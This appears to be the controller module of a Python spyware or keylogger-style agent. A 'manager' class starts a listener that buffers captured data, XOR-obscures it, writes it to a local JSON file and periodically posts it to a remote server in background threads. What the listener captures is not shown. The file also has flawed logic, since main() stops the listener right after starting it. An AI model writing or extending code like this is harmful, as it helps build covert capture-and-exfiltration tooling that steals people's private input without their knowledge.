from src.listener import Listener
from src.writer.console_log import ConsoleLog 
from src.writer.file_log import FileLog 
from src.writer.json_log import JsonLog 
from src.parser.encryption.xor import Xor
from src.parser.encryption.parsers import Parser
from time import sleep
from threading import Thread
from agent_network.send_json import post_json
from config.config import write_delay, send_json_delay 


 


class manager:
    def __init__(self):
        self.listenr = Listener()
        self.consoel_writer = ConsoleLog()
        self.file_writer = FileLog()
        self.json_writer = JsonLog()
        self.Parser = Parser()
        self.xor = Xor()


    def write_data(self):
        while True:
            sleep(write_delay) 
            if self.listenr.buffer_has_data():
                buffer = self.listenr.get_buffer()
                parser_buffer = self.Parser.parse_data(buffer) # preser the list -> str
                enc_buffer = self.xor.encrypt(parser_buffer) # encript the str 
                self.json_writer.write(enc_buffer) # write -> json
            


    def send_json(self):
        while True:
            sleep(send_json_delay)
            post_json()


    def main(self):
        self.listenr.start() ## start listening
        Thread(target=self.write_data, daemon=True).start() ## writeing local json thred
        Thread(target=self.send_json, daemon=True).start() ## send json to server thread
        self.listenr.stop() ## stop listening


